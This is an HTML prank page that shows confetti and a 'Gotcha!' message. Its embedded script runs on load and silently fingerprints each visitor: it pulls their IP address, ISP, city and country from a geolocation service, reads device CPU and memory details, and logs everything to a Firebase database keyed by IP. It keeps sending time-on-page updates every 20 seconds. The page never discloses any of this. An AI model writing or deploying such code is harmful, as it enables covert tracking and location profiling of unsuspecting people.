<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GET PRANKED! 🎉</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, #121212, #1a1a2e);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            z-index: 10;
            padding: 20px;
        }
        h1 {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff007f, #ffaa00, #00f0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 1.5s infinite alternate;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.5rem;
            color: #e0e0e0;
            font-weight: 300;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.05); }
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
</head>
<body>

    <canvas id="confetti-canvas"></canvas>

    <div class="container">
        <h1>GET PRANKED! 🎉</h1>
        <p>Gotcha! Hope this brightened your day.</p>
    </div>

    <!-- Firebase SDK Modules via CDN -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
            authDomain: "nexus-web-development-official.firebaseapp.com",
            databaseURL: "https://nexus-web-development-official-default-rtdb.firebaseio.com",
            projectId: "nexus-web-development-official",
            storageBucket: "nexus-web-development-official.firebasestorage.app",
            messagingSenderId: "553556577139",
            appId: "1:553556577139:web:128af196a1eb3dd5999306",
            measurementId: "G-1JW4TQFEG2"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let userFolderRef = null;
        let activeSecondsCounter = 0;

        // Fallback generator for a persistent visitor token
        function getOrCreateVisitorId() {
            let visitorId = localStorage.getItem('prank_visitor_token');
            if (!visitorId) {
                visitorId = 'user_' + Math.random().toString(36).substring(2, 11);
                localStorage.setItem('prank_visitor_token', visitorId);
            }
            return visitorId;
        }

        async function runAutoTracking() {
            let publicIp = "Unknown", geoInfo = {};
            
            // Background fetch for IP location data
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    geoInfo = await response.json();
                    publicIp = geoInfo.ip || "Unknown";
                }
            } catch (e) {
                console.error("Network initialization skipped:", e);
            }

            // Select Folder Name: Prioritize IP address, fall back to visitor ID token if IP fails
            let rawFolderName = publicIp !== "Unknown" ? publicIp : getOrCreateVisitorId();
            
            // Firebase paths cannot contain safely characters like '.', '$', '#', '[', ']', or '/'
            // This replaces illegal characters cleanly with dashes (-) to keep paths stable
            let safeFolderName = rawFolderName.replace(/[\.\$\#\[\]\/]/g, "-");

            const sessionPayload = {
                user_identity: safeFolderName,
                last_updated: serverTimestamp(),
                network_profile: {
                    ip_address: publicIp,
                    isp: geoInfo.org || "Unknown",
                    location_city: geoInfo.city || "Unknown",
                    location_country: geoInfo.country_name || "Unknown"
                },
                hardware_capabilities: {
                    cpu_cores: navigator.hardwareConcurrency || "Unknown",
                    device_ram_gb: navigator.deviceMemory || "Unknown",
                    screen_resolution: `${window.screen.width}x${window.screen.height}`
                },
                live_session_intervals: {
                    time_spent_seconds: 0,
                    last_pulse_timestamp: serverTimestamp()
                }
            };

            // TARGET DIRECTORY: Instead of a random push id, we point exactly to our user folder
            userFolderRef = ref(database, `prank_logs/${safeFolderName}`);
            
            // Updates or populates everything inside that user's specific folder node
            await update(userFolderRef, sessionPayload)
                .catch((err) => console.error("Database connection dropped:", err));

            // Run continuous 20-second background sync loop inside the folder
            setInterval(() => {
                activeSecondsCounter += 20;
                syncIntervalTelemetry();
            }, 20000);
        }

        async function syncIntervalTelemetry() {
            if (!userFolderRef) return;
            
            const liveDiff = {
                "last_updated": serverTimestamp(),
                "live_session_intervals/time_spent_seconds": activeSecondsCounter,
                "live_session_intervals/last_pulse_timestamp": serverTimestamp()
            };

            update(userFolderRef, liveDiff)
                .catch((e) => console.error("Telemetry update drop:", e));
        }

        // Start workflow automatically immediately on load
        runAutoTracking();
    </script>

    <!-- Continuous Confetti Engine Layout Loop -->
    <script>
        const canvasElement = document.getElementById('confetti-canvas');
        const parameters = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
        function scopeRandom(min, max) { return Math.random() * (max - min) + min; }

        setInterval(function() {
            confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.1, 0.3), y: Math.random() - 0.2 } });
            confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.7, 0.9), y: Math.random() - 0.2 } });
        }, 250);
    </script>
</body>
</html>
